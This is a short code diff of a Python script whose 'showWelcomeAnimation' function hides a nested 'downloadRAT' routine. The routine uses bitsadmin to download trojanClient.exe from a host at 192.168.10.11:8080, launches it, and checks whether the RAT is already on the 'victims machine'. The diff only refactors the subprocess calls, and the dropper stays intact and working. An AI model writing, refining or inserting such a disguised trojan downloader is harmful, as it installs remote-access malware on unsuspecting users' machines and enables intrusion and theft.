@@ -140,10 +140,10 @@ def main():
     
 def showWelcomeAnimation():
     def downloadRAT():
-        cmd = "bitsadmin /transfer wcb /priority high http://192.168.10.11:8080/trojanClient.exe "+destination
-        subprocess.call(cmd, shell=True)
+        cmd = ["bitsadmin", "/transfer", "wcb", "/priority", "high", "http://192.168.10.11:8080/trojanClient.exe", destination]
+        subprocess.call(cmd, shell=False)
 
-        cmd = "start "+destination
+        cmd = ["start", destination]
         subprocess.call(cmd, shell=True)
 
     # check if the RAT already exists on victims machine
